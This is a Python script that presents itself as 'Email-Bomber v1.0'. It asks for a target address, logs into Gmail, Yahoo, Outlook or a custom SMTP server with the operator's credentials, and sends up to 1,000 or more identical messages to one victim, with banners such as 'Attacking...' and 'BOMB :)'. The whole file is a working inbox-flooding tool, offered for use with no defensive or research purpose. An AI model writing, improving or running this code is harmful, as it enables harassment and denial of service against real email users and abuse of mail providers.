import smtplib
import sys

class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'


def banner():
    print(bcolors.GREEN + '+[+[+[ Email-Bomber v1.0 ]+]+]+')
    print(bcolors.GREEN + '+[+[+[ Made With Python ]+]+]+')
    print(bcolors.GREEN + ''' 
___________.__             __________                 .__   ________                   .__   
\__    ___/|  |__    ____  \______   \  ____  _____   |  |  \______ \    ____  _____   |  |  
  |    |   |  |  \ _/ __ \  |       _/_/ __ \ \__  \  |  |   |    |  \ _/ __ \ \__  \  |  |  
  |    |   |   Y  \\  ___/  |    |   \\  ___/  / __ \_|  |__ |    `   \\  ___/  / __ \_|  |__
  |____|   |___|  / \___  > |____|_  / \___  >(____  /|____//_______  / \___  >(____  /|____/
                \/      \/         \/      \/      \/               \/      \/      \/       
 Made By AxoDude-Death''')


class EmailBomber:
    count = 0

    def __init__(self):
        try:
            print(bcolors.RED + '\n[+[+[+ Initializing program ]+]+]+')
            self.target = str(input(bcolors.GREEN + 'Enter Target email <: '))
            self.mode = int(input(bcolors.GREEN + 'Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) <: '))
            if self.mode > 4 or self.mode < 1:
                print(bcolors.RED + 'ERROR: Invalid Option, Goodbye.')
                sys.exit(1)
        except Exception as e:
            print(f'ERROR: {e}')
            sys.exit(1)

    def bomb(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Setting up bomb ]+]+]+')
            if self.mode == 1:
                self.amount = 1000
            elif self.mode == 2:
                self.amount = 500
            elif self.mode == 3:
                self.amount = 250
            else:
                self.amount = int(input(bcolors.GREEN + 'Choose a CUSTOM amount <: '))
            print(bcolors.RED + f'\n+[+[+[ You have selected Bomb mode: {self.mode} with {self.amount} emails ]+]+]+')
        except Exception as e:
            print(f'ERROR: {e}')
            sys.exit(1)

    def email(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Setting up email ]+]+]+')
            server_choice = input(bcolors.GREEN + 'Enter email server | 1: Gmail 2: Yahoo 3: Outlook <: ')
            default_port = True

            if server_choice not in ['1', '2', '3']:
                default_port = False
                self.server = input(bcolors.GREEN + 'Enter SMTP server address <: ')
                self.port = int(input(bcolors.GREEN + 'Enter port number <: '))
            else:
                self.port = 587  # Default SMTP port
                if server_choice == '1':
                    self.server = 'smtp.gmail.com'
                elif server_choice == '2':
                    self.server = 'smtp.mail.yahoo.com'
                elif server_choice == '3':
                    self.server = 'smtp-mail.outlook.com'

            self.fromAddr = input(bcolors.GREEN + 'Enter your email address <: ')
            self.fromPwd = input(bcolors.GREEN + 'Enter your email password <: ')
            self.subject = input(bcolors.GREEN + 'Enter email subject <: ')
            self.message = input(bcolors.GREEN + 'Enter email message <: ')

            self.msg = f"From: {self.fromAddr}\nTo: {self.target}\nSubject: {self.subject}\n\n{self.message}"

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'ERROR: {e}')
            sys.exit(1)

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count += 1
            print(bcolors.YELLOW + f'BOMB :) {self.count}')
        except Exception as e:
            print(f'ERROR: {e}')

    def attack(self):
        print(bcolors.RED + '\n+[+[+[ Attacking... ]+]+]+')
        for email in range(self.amount):
            self.send()
        self.s.close()
        print(bcolors.GREEN + '\n+[+[+[ Attack finished ]+]+]+')
        sys.exit(0)


if __name__ == '__main__':
    banner()
    bomber = EmailBomber()
    bomber.bomb()
    bomber.email()
    bomber.attack()
